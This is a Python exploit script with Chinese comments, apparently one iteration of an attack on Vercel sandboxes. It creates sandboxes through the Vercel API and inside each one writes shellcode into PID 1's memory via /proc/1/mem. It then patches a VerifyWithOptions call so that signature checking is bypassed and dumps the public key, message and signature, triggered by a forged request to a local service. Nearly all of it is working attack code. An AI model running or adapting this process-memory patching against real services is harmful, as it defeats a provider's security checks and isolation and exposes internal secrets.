# 实验J209b: 多沙箱重试版 - patch 0x83b553(call VerifyWithOptions) -> shellcode dump全参数 + 返valid=false
# 成功标志: SAVE区非零(pub/msg/sig已dump) -> 输出 PUB/MSG/SIG
# I-cache概率: 每个沙箱~50%, 4沙箱失败率~6%
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=120):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

CODE = r'''
import os, time, socket, struct
out = open("/tmp/d209.txt", "w")
def p(*a):
    line = " ".join(str(x) for x in a)
    out.write(line + "\n"); out.flush()
    print(line, flush=True)

p("start")
fd = os.open("/proc/1/mem", os.O_RDWR)
def read_at(addr, n):
    os.lseek(fd, addr, 0)
    return os.read(fd, n)
def write_at(addr, b):
    os.lseek(fd, addr, 0)
    return os.write(fd, b)

# PA: 找text空区
p("CP", "PA")
os.lseek(fd, 0x400000, 0)
buf = os.read(fd, 0x8db000 - 0x400000)
i = buf.find(b"\x00" * 64)
if i < 0:
    i = buf.find(b"\xcc" * 64)
SC = 0x400000 + i
p("HOLE", hex(SC))

SAVE = 0x2ee1000
# v2: 同时dump P对象本身(verify参数1, 在[rsp+0xe0]) + pub/msg/sig参数
# SAVE+0x00=P  +0x08=pub.ptr  +0x10=pub.len  +0x18=msg.ptr  +0x20=msg.len  +0x28=sig.ptr  +0x30=sig.len
sc = bytes.fromhex(
    "49 89 c2"                    # mov r10, rax          ; r10 = pub.ptr
    "49 89 cb"                    # mov r11, rcx          ; r11 = msg.ptr
    "48 8b 84 24 e0 00 00 00"    # mov rax, [rsp+0xe0]   ; rax = P (verify参数1)
    "48 b9 0010ee0200000000"      # movabs rcx, 0x2ee1000 (SAVE)
    "48 89 01"                    # mov [rcx], rax        ; SAVE+0x00 = P
    "4c 89 51 08"                 # mov [rcx+8], r10      ; SAVE+0x08 = pub.ptr
    "48 89 59 10"                 # mov [rcx+0x10], rbx   ; SAVE+0x10 = pub.len
    "4c 89 59 18"                 # mov [rcx+0x18], r11   ; SAVE+0x18 = msg.ptr
    "48 89 79 20"                 # mov [rcx+0x20], rdi   ; SAVE+0x20 = msg.len
    "48 89 71 28"                 # mov [rcx+0x28], rsi   ; SAVE+0x28 = sig.ptr
    "4c 89 41 30"                 # mov [rcx+0x30], r8    ; SAVE+0x30 = sig.len
    "31 c0"                       # xor eax, eax
    "31 db"                       # xor ebx, ebx
    "c3"                          # ret
)
p("SC_LEN", len(sc))
write_at(SC, sc)
p("SC_WRITE", read_at(SC, len(sc)).hex() == sc.hex())

CALL = 0x83b553
orig = read_at(CALL, 5)
rel = SC - (CALL + 5)
patch = bytes([0xe8]) + struct.pack("<i", rel)
write_at(CALL, patch)
p("PATCH", orig.hex(), "->", read_at(CALL, 5).hex(), "OK" if read_at(CALL, 5) == patch else "FAIL")
write_at(SAVE, b"\x00" * 0x40)

p("CP", "PC")
def http(port, method, path, headers, body=b"", to=5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(to)
        s.connect(("127.0.0.1", port))
        hdrs = f"{method} {path} HTTP/1.1\r\nHost: 127.0.0.1\r\n"
        for k, v in headers.items():
            hdrs += f"{k}: {v}\r\n"
        hdrs += f"Content-Length: {len(body)}\r\n\r\n"
        s.send(hdrs.encode() + body)
        d = b""
        try:
            while True:
                b2 = s.recv(4096)
                if not b2:
                    break
                d += b2
                if len(d) > 4000:
                    break
        except Exception:
            pass
        s.close()
        return d
    except Exception as ex:
        return ("EXC:" + repr(ex)).encode()

now = str(int(time.time()))
d = http(30001, "POST", "/foo",
         {"Content-Type": "application/connect+json", "Connect-Protocol-Version": "1",
          "X-Signature": "AAAA", "X-Timestamp": now}, b"{}")
p("REQ1_RESP", d[:300])
time.sleep(0.6)

p("CP", "PD")
sv = read_at(SAVE, 0x40)
p("SAVE", sv.hex())
if sv != b"\x00" * 0x40:
    P, pub_ptr, pub_len, msg_ptr, msg_len, sig_ptr, sig_len = struct.unpack("<QQQQQQQ", sv[0:56])
    p("PARAMS", "P=" + hex(P), "pub=" + hex(pub_ptr), pub_len, "msg=" + hex(msg_ptr), msg_len, "sig=" + hex(sig_ptr), sig_len)
    # dump P对象结构前0x60字节 (看字段布局)
    try:
        pctx = read_at(P, 0x60)
        p("P_CTX", pctx.hex())
    except Exception as e:
        p("P_CTX_ERR", repr(e))
    try:
        pub = read_at(pub_ptr, pub_len)
        p("PUB", pub.hex())
    except Exception as e:
        p("PUB_ERR", repr(e))
    try:
        msg = read_at(msg_ptr, min(msg_len, 256))
        p("MSG_HEX", msg.hex())
        s = "".join(chr(c) if 32 <= c < 127 else "." for c in msg)
        p("MSG_STR", repr(s))
    except Exception as e:
        p("MSG_ERR", repr(e))
    try:
        sig = read_at(sig_ptr, min(sig_len, 128))
        p("SIG", sig.hex())
    except Exception as e:
        p("SIG_ERR", repr(e))
else:
    p("SAVE_EMPTY", "verify未执行或patch未生效")

p("CP", "PE")
try:
    write_at(CALL, orig)
    p("RESTORE_CALL", read_at(CALL, 5).hex())
    write_at(SC, b"\x00" * len(sc))
    p("RESTORE_SC", "ok")
except Exception as e:
    p("RESTORE_ERR", repr(e))
p("done")
out.close()
os.close(fd)
'''

def run_cmd(sid, code, label, timeout=200):
    body = {"command": "python3", "args": ["-c", code],
            "wait": True, "logs": True, "timeout": timeout}
    for attempt in range(3):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            return "DEAD", ""
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ("DEAD" if "sandbox_stopped" in r else ""), ""
    out_all = []
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out_all.append(d.get("data", ""))
            elif d.get("stream") == "command":
                out_all.append(f"\nEXIT: {d.get('command', {}).get('exitCode')}\n")
        except Exception:
            out_all.append(line[:400])
    text = "".join(out_all)
    print(text, flush=True)
    return "", text

# 主循环: 最多5个沙箱
for attempt in range(5):
    name = f"expj209r{attempt}"
    api("DELETE", f"/v2/sandboxes/{name}?teamId={TEAM}&projectId={PROJ}")
    c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
               {"projectId": PROJ, "name": name})
    print(f"\n### attempt {attempt} create: {c}", flush=True)
    if c != 200:
        print(r[:400], flush=True)
        time.sleep(10)
        continue
    sid = json.loads(r)["sandbox"]["currentSessionId"]
    print("sid:", sid, flush=True)
    st, text = run_cmd(sid, CODE, f"J209r{attempt}", timeout=200)
    if "SAVE " in text and "SAVE_EMPTY" not in text:
        print("\n>>> SUCCESS: 参数已dump, 终止重试", flush=True)
        api("DELETE", f"/v2/sandboxes/{name}?teamId={TEAM}&projectId={PROJ}")
        break
    if "SAVE_EMPTY" in text:
        # patch生效但verify没到? 可能请求没触发 -> 重试同沙箱发REQ2?
        print("  SAVE_EMPTY: patch生效但verify未触发", flush=True)
    api("DELETE", f"/v2/sandboxes/{name}?teamId={TEAM}&projectId={PROJ}")
    print(f"  attempt {attempt} done, sleep 3", flush=True)
    time.sleep(3)

print("\nall attempts done", flush=True)
